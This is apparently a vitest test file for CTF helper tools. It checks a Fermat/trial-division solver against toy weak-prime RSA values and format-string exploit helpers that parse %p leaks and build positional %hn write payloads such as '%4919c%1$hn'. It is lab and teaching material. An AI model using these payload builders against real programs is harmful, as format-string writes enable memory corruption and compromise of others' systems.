import { describe, it, expect } from 'vitest';
import {
    factorModulus, modInverse, powMod, solveRsaWeak,
    parseLeak, findCounterArg, buildCounterWrite,
} from '../tools/ctf-classics.js';

// The live challenge values (ctf_rsa_weak /challenge — deterministic training values)
const N = 1000036000099n;      // 1000003 * 1000033 — deliberately close tiny primes
const E = 65537n;
const ANSWER = 424242n;
const C = 598195729194n;       // pow(ANSWER, E, N) — captured from the live /challenge endpoint

describe('RSA weak-prime solver (values captured live from ctf_rsa_weak)', () => {
    it('factors the close-prime modulus via Fermat and decrypts the real ciphertext', () => {
        const [p, q] = factorModulus(N);
        expect(p * q).toBe(N);
        expect([p, q].sort((a, b) => (a < b ? -1 : 1))).toEqual([1000003n, 1000033n]);
        const d = modInverse(E, (p - 1n) * (q - 1n));
        const m = powMod(C, d, N);
        expect(m).toBe(ANSWER);
    });

    it('solveRsaWeak classifies the method and returns the decrypted answer', () => {
        const r = solveRsaWeak(N, E, C);
        expect(r.method).toBe('fermat-close-primes');
        expect(r.m).toBe(ANSWER);
        expect(r.p * r.q).toBe(N);
        expect(r.d).toBe(modInverse(E, (r.p - 1n) * (r.q - 1n)));
    });

    it('trial-division wins when a factor is genuinely tiny', () => {
        const n = 101n * 359n * 3593n; // small factors
        const r = solveRsaWeak(n, E);
        expect(r.method).toBe('trial-division');
        expect(r.p * r.q).toBe(n);
    });

    it('powMod is square-and-multiply — a raw BigInt ** would OOM on e=65537-scale exponents', () => {
        expect(powMod(424242n, 65537n, N)).toBe(C);
        expect(powMod(2n, 10n, 1000n)).toBe(24n);
    });

    it('modInverse rejects non-coprime pairs instead of returning garbage', () => {
        expect(() => modInverse(4n, 8n)).toThrow(/no modular inverse/);
    });
});

describe('format-string counter-write (invariants proven on ctf_format_string :9002)', () => {
    it('parses a %p leak line into vararg values', () => {
        const args = parseLeak('0x4040a4|0xe|0x2bb1a000|0x21001|0x4847464544434241');
        expect(args).toEqual(['0x4040a4', '0xe', '0x2bb1a000', '0x21001', '0x4847464544434241']);
    });

    it('finds the counter pointer among REGISTER varargs only (1-4)', () => {
        expect(findCounterArg(['0x4040a4', '0xe', '0x2bb1a000', '0x21001'])).toEqual({ index: 1, value: '0x4040a4' });
        // a data pointer on the STACK (arg 5+, e.g. the marker'd buffer contents) is not the register-held counter
        expect(findCounterArg(['0xe', '0x2bb1a000', '0x21001', '0x4040b0', '0x4040a4'])).toEqual({ index: 4, value: '0x4040b0' });
    });

    it('builds the all-positional write — %1$hn through the register-held pointer', () => {
        expect(buildCounterWrite(1, 0x1337)).toBe('%4919c%1$hn');
        expect(buildCounterWrite(2, 0x1337)).toBe('%4919c%2$hn');
    });

    it('refuses values that do not fit the %hn 2-byte window', () => {
        expect(() => buildCounterWrite(1, 0)).toThrow(/out of range/);
        expect(() => buildCounterWrite(1, 0x10000)).toThrow(/out of range/);
    });
});
